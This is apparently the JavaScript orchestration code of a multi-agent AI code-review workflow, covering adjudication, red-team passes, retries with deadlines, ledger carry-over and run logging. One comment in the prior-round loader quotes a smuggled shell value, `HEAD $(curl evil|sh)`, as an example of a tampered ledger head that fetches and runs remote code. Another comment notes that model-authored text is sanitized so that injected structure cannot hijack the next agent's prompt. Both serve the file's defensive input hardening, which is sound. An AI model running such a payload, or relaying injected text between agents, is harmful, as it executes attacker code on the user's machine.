  if (!isHighSeverity(f.severity)) return { adj, died: false, overturned: false, invalid: false }
  if (rt == null) return { adj: { ...adj, note: `${adj.note || ''} [red-team did not run — agent died; resolved on the adjudicator's attack pass alone]`.trim() }, died: true, overturned: false, invalid: false }
  const atk = sanitizeAttack(rt.attack)
  if (rt.defeated && !atk) return { adj: { ...adj, note: `${adj.note || ''} [red-team claimed defeat with no attack — invalid verdict discarded; resolved on the adjudicator's attack pass alone]`.trim() }, died: false, overturned: false, invalid: true }
  if (rt.defeated) return { adj: { ...adj, status: 'still-open', attack: `(red-team) ${atk}` }, died: false, overturned: true, invalid: false }
  return { adj, died: false, overturned: false, invalid: false }
}

// Pure per-finding dispatch: map a finding + its adjudication result (r may be null) to a track
// and a ledger-ready entry. Caller pushes entry onto adjudicated[track] and does logging.
function adjudicateOne(f, r) {
  const located = { ...f, line: r?.currentLine || f.line }
  const attack = sanitizeAttack(r?.attack)
  if (r == null) return { track: 'stillOpen', adjudicatorDied: true, entry: { ...located, why: `${baseWhy(f.why)} — still-open (adjudicator did not run — agent died; kept still-open by default)` } }
  const status = r.status || 'still-open'
  if (status === 'resolved' && attack) return { track: 'stillOpen', demoted: true, entry: { ...located, why: `${baseWhy(f.why)} — fix incomplete (adjudicator reported attack despite resolved): ${attack}` } }
  if (status === 'resolved') return { track: 'resolved', entry: { ...located, disposition: 'closed', ...(r.note ? { note: sanitizeAttack(r.note) } : {}) } }
  if (status === 'regressed') { const note = sanitizeAttack(r.note); return { track: 'regressed', entry: { ...located, why: note ? `${baseWhy(f.why)} — REGRESSED after fix: ${note}` : `${baseWhy(f.why)} — REGRESSED after fix (no detail returned by adjudicator)` } } }
  return { track: 'stillOpen', entry: attack ? { ...located, why: `${baseWhy(f.why)} — fix incomplete: ${attack}` } : located }
}

// The invariant string interpolated into the red-team prompt is model-authored (from the
// adjudicator's own verdict, falling back to the finding `why`). Route it through sanitizeAttack
// so runaway/injected structure cannot restyle or hijack the next agent's prompt.
function redTeamInvariant(adj, f) {
  return sanitizeAttack(adj.invariant) || sanitizeAttack(f.why)
}

// Whether a "resolved" verdict is worth an independent red-team pass. A resolved verdict that
// ALREADY carries an attack is self-contradictory — adjudicateOne demotes it — so red-teaming it
// wastes an opus call and lets the red-team overwrite the adjudicator's own attack. Only a genuinely
// clean resolved (no attack) gets red-teamed. Emptiness is judged on the SANITIZED attack so a
// markdown-only "attack" counts as none.
function shouldRedTeam(r) {
  return r?.status === 'resolved' && !sanitizeAttack(r.attack)
}

// ---- resilient agent call ----
// agent() returns null when the subagent dies on a terminal API error (after the harness's own
// retries) or is skipped. A single quiet re-dispatch recovers most API deaths. Budget-exceeded
// THROWS and is deliberately not caught — retrying it would just throw again.
const AGENT_TRIES = 2
// Every prompt in this workflow goes through ragent, so this is the one place that can retarget the
// whole review at another checkout. Prepended (not appended) because it has to win over the git
// commands the individual prompts spell out; shq() because the path is an argument to a real `cd`.
const REPO_DIRECTIVE = repoArg
  ? `WORKING DIRECTORY: this review targets the repository at ${shq(repoArg)} — NOT the directory you start in. Before ANY git / cargo / nix / file command, \`cd\` there (or pass \`git -C\`). Every file path in this review is relative to that root. If that directory does not exist or is not a git repository, say so and stop rather than reviewing whatever repo you happen to be sitting in.\n\n`
  : ''
// ---- per-agent wall-clock deadline ----
// The retry above only fires when agent() RESOLVES to null. An agent whose request hangs mid-response
// never resolves and never throws, so nothing above catches it. A measured run lost 64 minutes — a
// third of its wall clock — to six agents frozen inside one `parallel()` barrier, and then died
// without writing anything. The fix is to stop WAITING, not to wait more cleverly.
//
// Honest limit: the sandbox exposes setTimeout/clearTimeout but no AbortController, so losing the
// race abandons the wait without cancelling the agent — a hung one keeps its concurrency slot until
// the harness reaps it. That is still the difference between a phase that proceeds shorthanded and a
// review that stops dead, which is what actually happened.
//
// Deadlines are per phase and sit ABOVE the measured maximum of legitimate work (two runs, 213
// agents): verify 811s max → 15min, batch 370s → 15min, lens 2791s → 60min, gate 434s → 30min. Set
// them below real work and this turns into a retry storm that is slower than the stall it replaces.
const DEADLINE_HIT = { craftDeadline: true }
const DEFAULT_DEADLINE_MS = 1800000
const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 3600000, Verify: 900000, Adjudicate: 1800000, Synthesize: 1800000 }
function deadlineMsFor(opts) {
  const explicit = Number(opts.deadlineMs)
  if (Number.isFinite(explicit) && explicit > 0) return explicit
  return PHASE_DEADLINE_MS[opts.phase] ?? DEFAULT_DEADLINE_MS
}
async function ragent(prompt, opts = {}) {
  // deadlineMs is ours, not agent()'s — strip it so it never reaches the harness as an unknown option.
  const { deadlineMs: _deadlineMs, ...agentOpts } = opts
  const ms = deadlineMsFor(opts)
  for (let attempt = 1; ; attempt++) {
    const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
    let timer = null
    const res = await Promise.race([
      agent(`${REPO_DIRECTIVE}${prompt}`, o),
      new Promise(resolve => { timer = setTimeout(() => resolve(DEADLINE_HIT), ms) }),
    ])
    clearTimeout(timer)
    if (res === DEADLINE_HIT) {
      const mins = Math.round(ms / 60000)
      log(`⏱️ agent '${o.label || '?'}' passed its ${mins}min deadline with no response — abandoning the wait${attempt < AGENT_TRIES ? ' and re-dispatching once' : ' (giving up; treated as a dead agent)'}`)
      if (attempt >= AGENT_TRIES) return null
      continue
    }
    if (res !== null && res !== undefined) return res
    if (attempt >= AGENT_TRIES) return null
    log(`⚠️ agent '${opts.label || '?'}' returned no result (API death or skip) — re-dispatching once`)
  }
}

// ---- run-record helpers (VERBATIM mirror of lib/run-record.mjs — the sandbox can't import; keep in sync) ----
// Mirrors: countBySeverity, summarizeFindings, reviewVerdict, titleShingle,
// fingerprint, shingleOverlap, matchesPrior, DISPOSITION_FROM_TRIAGE, dispositionFromTriage,
// rereviewVerdict. (selectPriorRound is NOT mirrored: round selection, ancestry and record loading
// now happen in `craft-log-run.mjs prior-round`, so no mirror is needed — a haiku still runs the
// command and carries the bytes back, but it decides nothing.)
// >>> craft-inline lib/run-record.mjs SEVERITIES countBySeverity summarizeFindings reviewVerdict
const SEVERITIES = ['Critical', 'High', 'Medium', 'Low', 'Info']

function countBySeverity(findings) {
  const by = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 }
  for (const f of (Array.isArray(findings) ? findings : [])) {
    if (f && Object.prototype.hasOwnProperty.call(by, f.severity)) by[f.severity] += 1
  }
  return by
}

function summarizeFindings(findings) {
  const bySeverity = countBySeverity(findings)
  return { total: SEVERITIES.reduce((n, s) => n + bySeverity[s], 0), bySeverity }
}

function reviewVerdict(confirmed) {
  const by = countBySeverity(confirmed)
  if (by.Critical || by.High) return 'Block'
  if (by.Medium) return 'Warning'
  return 'Approve'
}
// <<< craft-inline
// finalVerdict is workflow-local — NOT part of the lib/run-record.mjs mirror above.
// In strict mode the maintainability bar is a presumption of block: any Confirmed
// maintainability finding at Medium or above escalates the verdict to Block. Outside strict mode
// the base verdict stands (maintainability findings are at most a Warning).
// A finding counts as maintainability for the strict escalation if its own source is maintainability
// OR a maintainability finding was merged into it during cross-lens dedup (dedupPool carries every
// contributing source in `sources`). Without the second clause a maintainability finding absorbed
// under a same-severity non-maintainability base would silently escape the strict Block.
function isMaintainability(f) {
  return (f.source || '') === 'maintainability' || (Array.isArray(f.sources) && f.sources.includes('maintainability'))
}
function finalVerdict(confirmed) {
  if (strict && confirmed.some(f => isMaintainability(f)
    && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) return 'Block'
  return reviewVerdict(confirmed)
}
// indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
// the index line. A second copy in the workflow would be a copy nothing calls — free to drift out of
// sync with the projection that actually gets written, which is the worst kind of dead code.
// A phase checkpoint. Small by construction — counts, per-lens yields, the gate verdict — because
// its job is to survive the run, not to duplicate the final record early. `runDir` is threaded back
// out of the first call so every later checkpoint lands in the same directory without the sandbox
// needing a clock or a run id (it has neither).
const CHECKPOINT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runDir'],
  properties: { runDir: { type: 'string', description: 'the runDir the script printed; empty string if it failed' } },
}
let runDir = ''
async function checkpoint(phase, payloadIn, group) {
  // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
  // that name to rebuild a dead run's identity. A payload without them produced a real
  // `…Z-unknown-unknown` directory on the first live run — recoverable, but recovered as a run of
  // nothing. They belong on every slice, not just the final record.
  const payload = { kind: 'workflow', name: 'review', ...payloadIn }
  const res = await ragent(
    `You are the craft observability logger writing ONE phase checkpoint. Mechanical IO — do not analyze.

Run exactly this, then return the runDir the script prints:

\`\`\`
cat > /tmp/craft-ckpt.json <<'CRAFT_CKPT_EOF'
…PAYLOAD below, byte for byte…
CRAFT_CKPT_EOF
${LOGGER_PRELUDE}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} checkpoint --phase ${shq(phase)} ${runDir ? `--dir ${shq(runDir)} ` : ''}--project "$PWD" < /tmp/craft-ckpt.json
\`\`\`

The script owns naming, sequencing and every computed field. Copy PAYLOAD verbatim into the quoted heredoc. Best-effort: if it fails, report the error line and do NOT retry by writing files yourself.

PAYLOAD:
${JSON.stringify(payload, null, 2)}`,
    { label: `checkpoint:${phase}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
  )
  if (res?.runDir) runDir = res.runDir
}

// Persisting the record is deterministic work, and it is now done by lib/craft-log-run.mjs. The model
// is left in the loop only because the sandbox cannot reach a filesystem at all — its entire job is a
// quoted heredoc into the script. It no longer computes ts/project/commit/dirty, chooses the filename,
// hand-appends the index or hand-verifies the readback; that recipe is what once persisted a completed
// review as `dimensions: [], verification: null`. Fewer decisions in the prompt is the whole fix.
async function logRun(record) {
  // Copying a large record verbatim is not a low-effort task: haiku is fine for a gate-failed stub,
  // but a full review record carries every finding plus the ledger, and the cheap model is where the
  // silent truncation came from. Size the model to the payload.
  const payloadKB = JSON.stringify(record).length / 1024
  const big = payloadKB > 24
  await ragent(
    `You are the craft observability logger. Persist ONE run record. This is mechanical IO — do not analyze, summarise, reformat or "clean up" any part of it.

Run exactly this:

\`\`\`
cat > /tmp/craft-rec.json <<'CRAFT_RECORD_EOF'
…RECORD below, byte for byte…
CRAFT_RECORD_EOF
${LOGGER_PRELUDE}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} finalize ${runDir ? `--dir ${shq(runDir)} ` : ''}--project "$PWD" < /tmp/craft-rec.json
\`\`\`

The script computes every field (ts, project, commit, dirty, craftCommit), names the file, appends the index line, folds in this run's phase checkpoints and verifies the readback. You compute NONE of that.

COPY THE RECORD VERBATIM into the quoted heredoc — it can be hundreds of KB (findings, ledger, dimensions), and re-emitting it from memory silently drops the big arrays. That is exactly how a completed review once persisted \`findings: 111\` with \`dimensions: []\` and no \`verification\`, destroying the per-lens telemetry the whole store exists for.

If the script prints a line starting \`craft-log-run FAILED\`, report that line verbatim and stop — do NOT fall back to writing the file by hand. Otherwise report its stdout. Best-effort either way: never error the run over this.

RECORD:
${JSON.stringify(record, null, 2)}`,
    { label: `log-run${big ? ` (${Math.round(payloadKB)}KB)` : ''}`, phase: 'Synthesize', model: big ? 'sonnet' : 'haiku', effort: 'low' },
  )
}

function key(f) {
  return `${(f.file || '').toLowerCase()}:${f.line || 0}:${(f.title || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
}

// >>> craft-inline lib/run-record.mjs titleShingle fingerprint shingleOverlap matchesPrior DISPOSITION_FROM_TRIAGE dispositionFromTriage rereviewVerdict
// Normalized, word-order-independent word-set of a finding title. Used inside the fingerprint and
// for fuzzy cross-round matching so a lightly reworded title still matches its prior-round twin.
function titleShingle(title) {
  return String(title || '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, ' ')
    .trim()
    .split(/\s+/)
    .filter(Boolean)
    .sort()
    .join(' ')
}

// Line-tolerant finding identity: hash of file + enclosing symbol + ruleId + title shingle.
// djb2 (not crypto) — the sandbox has no crypto and bans Math.random, and we only need a stable,
// collision-resistant-enough key, computed identically in the lib and in the workflow mirror.
function fingerprint(f) {
  const basis = [f?.file || '', f?.symbol || '', f?.ruleId || '', titleShingle(f?.title)].join('\0')
  let h = 5381
  for (let i = 0; i < basis.length; i++) h = ((h << 5) + h + basis.charCodeAt(i)) >>> 0
  return h.toString(16).padStart(8, '0')
}

function shingleOverlap(a, b) {
  const sa = new Set(titleShingle(a).split(' ').filter(Boolean))
  const sb = new Set(titleShingle(b).split(' ').filter(Boolean))
  if (!sa.size || !sb.size) return 0
  let inter = 0
  for (const w of sa) if (sb.has(w)) inter++
  return inter / Math.max(sa.size, sb.size)
}

// True when `cur` (a freshly located finding) is the same defect as `prior` (from the ledger).
// file + ruleId must match exactly; a symbol mismatch only disqualifies when BOTH carry one (a
// finding can move symbols across a fix, so an absent symbol is not a veto); titles must overlap.
function matchesPrior(cur, prior, { threshold = 0.6 } = {}) {
  if ((cur?.file || '') !== (prior?.file || '')) return false
  if ((cur?.ruleId || '') !== (prior?.ruleId || '')) return false
  if ((cur?.symbol || '') && (prior?.symbol || '') && cur.symbol !== prior.symbol) return false
  return shingleOverlap(cur?.title, prior?.title) >= threshold
}

// A ledger disposition sourced from a human triage decision. accept/needs-decision/conflict stay
// `open` (still to be adjudicated or fixed); only reject/defer carry a settled disposition.
const DISPOSITION_FROM_TRIAGE = { reject: 'rejected', defer: 'deferred', accept: 'open', 'needs-decision': 'open', conflict: 'open' }

function dispositionFromTriage(v) {
  return Object.prototype.hasOwnProperty.call(DISPOSITION_FROM_TRIAGE, v) ? DISPOSITION_FROM_TRIAGE[v] : 'open'
}

// Re-review verdict: reviewVerdict over the findings that still matter this round. resolved and
// carried (rejected/justified) findings are excluded by the caller, so they never reach here.
function rereviewVerdict({ stillOpen = [], regressed = [], neu = [] } = {}) {
  return reviewVerdict([...stillOpen, ...regressed, ...neu])
}
// <<< craft-inline
// A re-review scans lenses only over the fix delta (prevHead...HEAD) by default — cheap, but a defect
// in code an intermediate round did not touch is never re-scanned; only the carried ledger keeps it
// alive. Two pure guards close the resulting coverage holes (see the runtime use sites):
//   ledgerDegraded — the prior round reported findings but persisted NO ledger (an older craft run, or
//     one that failed to write one). The adjudicate track then has nothing to carry and the re-review
//     silently degrades to a near-first-pass. Detect it to warn AND force a full re-scan.
//   shouldFullRescan — every `fullEvery`-th re-review (and always when the ledger is degraded, or on a
//     first review) re-scans the FULL base...HEAD diff so an earlier miss in untouched code resurfaces.
//     fullEvery<=0 disables the periodic full scan (pure incremental).
//   ledgerTruncated — the ledger crosses an agent boundary as structured output. The loader script
//     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
//     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
//     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
function ledgerTruncated(priorRound) {
  if (!priorRound) return false
  const count = Number(priorRound.ledgerCount)
  if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
  return count !== (Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0)
}
function ledgerDegraded(priorRound) {
  if (!priorRound) return false
  if (ledgerTruncated(priorRound)) return true
  const findings = Number(priorRound.priorFindings || 0)
  const ledgerLen = Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0
  return findings > 0 && ledgerLen === 0
}
function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded }) {
  if (!priorRound) return true            // a first review is already a full base...HEAD scan
  if (degraded) return true               // nothing to carry — a delta-only scan would review almost nothing
  const n = Number(fullEvery)
  if (!Number.isFinite(n) || n < 1) return false
  return Number(thisRound) % n === 0
}

// A finding is "tool-sourced" — deterministic and re-runnable, so a verifier may refute it ONLY by
// re-running the tool — when it came from neither a review lens nor the negative-space lens nor
// dep-context. dep-context is a *reasoning* seed from the gate (version-specific API misuse) with no
// re-runnable tool behind it, so it must be verifiable by argument like a lens finding; classifying
// it as a tool would make it effectively unfalsifiable ("keep an unverifiable tool finding alive")
// and inflate the verdict with false Warnings.
function isToolSource(profile, source) {
  return !(profile.lenses.includes(source) || source === 'negative-space' || source === 'dep-context')
}

// ================= Detect base + languages =================
phase('Scout')
const detected = await ragent(
  `You are resolving the review base and the changed files. Use shell + read only — do NOT review.${pathArg ? `\n\nSCOPE: consider ONLY files under \`${pathArg}\`; pass \`-- ${pathArg}\` to the git commands below.` : ''}
1. Resolve the diff base. ${baseArg
    ? `Use \`${baseArg}\`.`
    : 'Try in order until one resolves: `git merge-base HEAD origin/main`, `git merge-base HEAD main`, `HEAD~1`. If the tree has uncommitted changes, target those.'}
2. List the changed file paths: \`git diff --name-only <base>...HEAD\`${pathArg ? ` -- ${pathArg}` : ''} (and include uncommitted changes from \`git status --porcelain\` if the tree is dirty).
3. Capture the VERBATIM change description as \`spec\` — the authors' own written claims/invariants, checked against code later. If the current branch has an OPEN PR, run \`gh pr view --json body,title\` and use its title + body. Otherwise use the commit messages on the diff range: \`git log <base>..HEAD --format=%B\`. Do not summarize or paraphrase — copy the text as-is. Truncate to ~4000 chars. Empty string if there is no PR and no commit body (e.g. only uncommitted changes). If \`gh\` is missing/unauthenticated, fall through to the commit messages.
4. Capture \`branch\` = \`git rev-parse --abbrev-ref HEAD\` (empty string if detached) and \`head\` = \`git rev-parse --short HEAD\` (empty string if not a git repo).
Return baseRef (the ref you resolved, empty string if none), files (the changed paths), spec (the verbatim description), branch, and head.`,
  { label: 'detect', schema: DETECT_SCHEMA, model: 'haiku', effort: 'low' },
)
// If base resolution died even after the retry, say so loudly — falling through would
// produce a misleading "Approve — no supported language" on an empty file list.
if (!detected) {
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (detect died)', findings: summarizeFindings([]), dimensions: [], verification: null, notRun: ['base/changed-files detection'], outputTokens: budget.spent(),
  })
  return [`## Verdict`, `⚠️ INCOMPLETE — the base-resolution agent died twice (API error); nothing was reviewed. Re-run the review.`].join('\n')
}
const baseRef = detected?.baseRef ?? baseArg
const changedFiles = Array.isArray(detected?.files) ? detected.files : []
// The authors' OWN written spec (PR body/title or commit messages) — checked claim-by-claim
// against the code by the intent lens. The one-line inferred `intent` is not enough: precise
// claims ("never fails on X", "the only way to Y", "idempotent no-op") live in the full body.
const spec = (typeof detected?.spec === 'string' ? detected.spec : '').slice(0, 4000)
const branch = (typeof detected?.branch === 'string' ? detected.branch : '').trim()
const head = (typeof detected?.head === 'string' ? detected.head : '').trim()

// Round detection: find the newest prior `review` run for this branch, and accept it as the prior
// round ONLY if its head is an ANCESTOR of the current HEAD (a rebase/force-push makes a stale run
// non-ancestor → treat as a fresh first review). `fresh` skips the whole mechanism.
let priorRound = null
if (!freshArg && branch && head) {
  priorRound = await ragent(
    `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.

Run exactly this:

\`\`\`
${LOGGER_PRELUDE}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-round --branch ${shq(branch)} --project "$PWD"
\`\`\`

It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, reason:"loader-did-not-run"}.`,
    { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
  )
  // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
  // command replaced: the first re-review of a branch whose rows predate the absolute-path key
  // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
  if (!priorRound?.found) {
    if (priorRound?.reason) log(`No prior round: ${priorRound.reason}`)
    priorRound = null
  }
  // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
  // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
  // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
  // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
  // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
  if (priorRound && !isCommitish(priorRound.head)) {
    log(`⚠️ prior-round head ${JSON.stringify(priorRound.head)} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
    priorRound.head = baseRef
  }
}
// Transport integrity: assert the ledger we received is the ledger the script printed.
if (priorRound && ledgerTruncated(priorRound)) {
  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound.ledgerCount} entr(ies), ${priorRound.ledger?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
}
if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${flattenField(priorRound.head)} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')

// Re-review coverage guards (see ledgerDegraded / shouldFullRescan). thisRound is the round number we
// are about to record; reused for the record below.
const thisRound = priorRound ? (priorRound.round || 1) + 1 : 1
const priorLedgerDegraded = ledgerDegraded(priorRound)
if (priorLedgerDegraded) {
  log(`⚠️ Re-review DEGRADED: prior round ${priorRound.round} reported ${priorRound.priorFindings} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
}
const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded: priorLedgerDegraded })
// On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
// regressions the fixes introduced. But every `fullEvery`-th round (and whenever the prior ledger is
// degraded) we widen back to the FULL base...HEAD diff so a defect an earlier round missed in code it
// never touched is re-discovered. `fresh` (priorRound=null) always keeps the full base...HEAD scan.
const lensBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
if (priorRound) {
  log(`Re-review round ${thisRound} lens scope: ${fullRescan
    ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}) — earlier misses in untouched code are re-checked`
    : `incremental delta ${flattenField(priorRound.head)}...HEAD (fix commits only)`}`)
}

// Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
// the detector missed (best-effort detection), honor the pin. An unknown pin id is an ERROR (it used
// to be dropped by `filter(Boolean)`), and a diff no profile covers is INCOMPLETE, never an Approve.
const { pinned: pinnedLangs, unknown: unknownLangs } = resolveProfilePin(requestedLangs)
if (unknownLangs.length) {
  const msg = unknownPinMessage(unknownLangs)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (unknown language pin)', findings: summarizeFindings([]), dimensions: [], verification: null,
    notRun: [`nothing ran — ${msg}`], outputTokens: budget.spent(),
  })
  return [`## Verdict`, `⛔ INCOMPLETE — ${msg}. NOTHING WAS REVIEWED; fix the \`languages\` argument and re-run.`].join('\n')
}
let active = Object.values(PROFILES).filter(p => (!pinnedLangs || pinnedLangs.includes(p.id)) && p.detect(changedFiles))
if (!active.length && pinnedLangs) active = pinnedLangs.map(id => PROFILES[id])
if (!active.length) {
  // Same notion of "material" as the partial-coverage path below: only files that could have carried
  // a defect lower the claim. A diff of nothing but docs/assets/lockfiles gets an honest green —
  // nothing was reviewed AND nothing needed reviewing. A diff of Python or Go source stays INCOMPLETE.
  if (!changedFiles.length) {
    const emptyMsg = noChangedFilesMessage()
    await logRun({
      schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
      languages: [], verdict: 'INCOMPLETE (empty diff)', findings: summarizeFindings([]), dimensions: [], verification: null,
      uncoveredFiles: [], notRun: [emptyMsg], outputTokens: budget.spent(),
    })
    return [
      `## Verdict`, `⚠️ INCOMPLETE — ${emptyMsg}`,
      ``, `## Detected`, detected?.notes || `0 changed file(s) against ${baseRef || 'HEAD'}`,
    ].join('\n')
  }
  const noProfileMaterial = materialUncovered(changedFiles)
  if (!noProfileMaterial.length) {
    const okMsg = nothingToReviewMessage(changedFiles.length)
    await logRun({
      schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
      languages: [], verdict: 'Approve (nothing to review)', findings: summarizeFindings([]), dimensions: [], verification: null,
      uncoveredFiles: changedFiles, notRun: [], outputTokens: budget.spent(),
    })
    return [
      `## Verdict`, `✅ Approve (NOTHING TO REVIEW) — ${okMsg}`,
      ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
      ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map(f => `- ${f}`),
    ].join('\n')
  }
  const msg = noLanguageMessage(changedFiles.length, noProfileMaterial.length)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (no language profile)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: changedFiles, notRun: [msg], outputTokens: budget.spent(),
  })
  return [
    `## Verdict`, `⚠️ INCOMPLETE — ${msg}`,
    ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map(f => `- ${f}`)] : []),
  ].join('\n')
}
log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinned: ${pinnedLangs.join(',')})` : ''} · base ${baseRef || 'HEAD'}`)

// Changed files no active profile covers are NOT reviewed — say so instead of silently shrinking scope.
// The material ones (anything that is not a doc, an asset or a lockfile) additionally join `notRun`
// further down, so the verdict itself carries the (INCOMPLETE) marker rather than a bare Approve.
const uncoveredFiles = changedFiles.filter(f => !active.some(p => p.detect([f])))
const uncoveredMaterial = materialUncovered(uncoveredFiles)
if (uncoveredFiles.length) log(`Outside all active profiles (not reviewed): ${uncoveredFiles.join(', ')}${uncoveredMaterial.length ? ` — ${uncoveredMaterial.length} material` : ' (docs/assets/lockfiles only)'}`)

// ================= Prompt builders (profile-parameterized) =================
function scoutPrompt(profile) {
  return `You are scouting a ${profile.lang} diff to plan an elastic review. Use shell + read only — do NOT review yet.${pathArg ? `\n\nSCOPE: review ONLY the crate/dir at \`${pathArg}\`. Pass \`-- ${pathArg}\` to every \`git diff\` command below.` : ''}

Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes / most recent commit'}. Consider only this profile's files (${profile.diffGlobs.join(' ')}).
1. Inspect \`git diff --stat ${lensBase ? `${shq(lensBase)}...HEAD` : 'HEAD'} -- ${profile.diffGlobs.join(' ')}\`. Set sizeBucket:
   small = a few files / < ~80 changed lines; large = many files / > ~400 lines or a public-API-heavy change; medium otherwise.
2. lenses: choose from ${JSON.stringify(profile.lenses)}.
   - small: only the touched categories (minimum 2; always include the dominant category, and include '${profile.safetyLens}' unless the diff clearly touches nothing related to ${profile.securityHints}).
   - medium: the categories plausibly in play.
   - large: all of them.
   ${profile.scoutRules}${strict ? '\n   STRICT MODE is on: ALWAYS include \'maintainability\' in lenses regardless of size.' : ''}
3. maxRounds: small=1, medium=2, large=3. verifyVotes: small/medium=1, large=3. lensModel: opus for all sizes (review reasoning runs on Opus; depth scales via maxRounds/verifyVotes/lens count).
4. isLibrary: ${profile.usesLibrary ? 'true if this is a published library (has `[lib]`/looks publishable) — best effort.' : 'always false (not applicable to this language).'}
5. securitySensitive: true if the diff touches ${profile.securityHints}.
6. intent: ${intentArg ? `the caller provided: "${intentArg}". Refine it from the diff if needed.` : 'infer the change\'s purpose from the diff and any PR/commit messages; empty string if unclear.'}
7. churn: list up to 5 files in the diff that git shows as frequently changed (\`git log --oneline -n 50 -- <file> | wc -l\` is a rough proxy). May be empty.`
}

function negativeSpacePrompt(priorSummary, profile, plan) {
  const intent = plan?.intent ?? intentArg
  return `You are the **negative-space** review lens for a ${profile.lang} change. Unlike the other lenses, your job is NOT to review the changed lines — it is to find the bug the diff ENABLES in code it did NOT touch. ${profile.navSkill ? `Load the ${profile.navSkill} skill for whole-repo search; use` : 'Use'} Grep/Glob across the ENTIRE tree, not just the diff.

Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes / most recent commit'}.
${intent ? `INTENT (what the change should do): ${intent}` : ''}
${plan?.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — an invariant the author claims here may be broken by the UNCHANGED code you inventory below):\n"""\n${plan.spec}\n"""` : ''}

METHOD — follow in order:
1. Inventory the NEW surface the diff introduces. Read the FULL diff: \`git diff ${lensBase ? `--merge-base ${shq(lensBase)}` : 'HEAD'}\`. List every new: ${profile.lang === 'Nix' ? 'flake output / module option / package attr / overlay / renamed binding' : 'enum variant / status value / DB column / table / migration / public fn / route / struct field'}. ALSO list any UNCHANGED definition the diff now references or relies on for the first time.
2. For EACH item, Grep the UNCHANGED tree for existing code that reads, references, ${profile.lang === 'Nix' ? 'imports, or overrides' : 'lists, updates, deletes, cascades, serializes, orders, or authorizes'} that shape. Ask: does this pre-existing path violate an invariant the change assumes?
3. Report each concrete violation ANCHORED TO THE UNCHANGED file:line that is actually wrong, not the diff line. That anchor is real — cite it precisely so it can be verified.

